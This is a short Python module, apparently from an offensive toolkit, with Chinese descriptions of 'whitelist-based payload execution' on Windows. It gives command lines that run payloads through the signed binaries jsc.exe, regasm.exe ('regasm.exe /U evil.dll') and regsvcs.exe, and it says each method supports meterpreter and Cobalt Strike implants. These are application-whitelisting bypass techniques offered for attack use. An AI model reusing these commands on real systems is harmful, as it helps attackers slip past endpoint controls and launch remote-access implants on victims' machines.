# encoding: utf8

class Shell:
    def __init__(self):
        self.info = {
            'Name': '本地执行程序',
            'Author': 'whois',
            'Update': '2019/3/09',
        }


        self.desc_jsc = """
基于白名单的方式执行payload - jsc


Windows 7默认位置
C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\jsc.exe

支持meterpreter和Cobalt

执行：
%WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\jsc.exe /t:winexe payload.js


测试平台：

"""


        self.desc_regasm = """
基于白名单的方式执行payload - Regasm

Regasm 为程序集注册工具，读取程序集中的元数据，并将所需的项添加到注册表中。RegAsm.exe是Microsoft Corporation开发的合法文件进程。它与Microsoft.NET Assembly Registration Utility相关联。

Windows 7默认位置
C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe

支持meterpreter和Cobalt

执行：
%WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U evil.dll


测试平台：

"""


        self.desc_regsvcs = """
基于白名单的方式执行payload - Regsvcs

Regsvcs为.NET服务安装工具。

Windows 7默认位置
C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe

支持meterpreter和Cobalt

执行：
%WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe evil.dll


测试平台：

"""

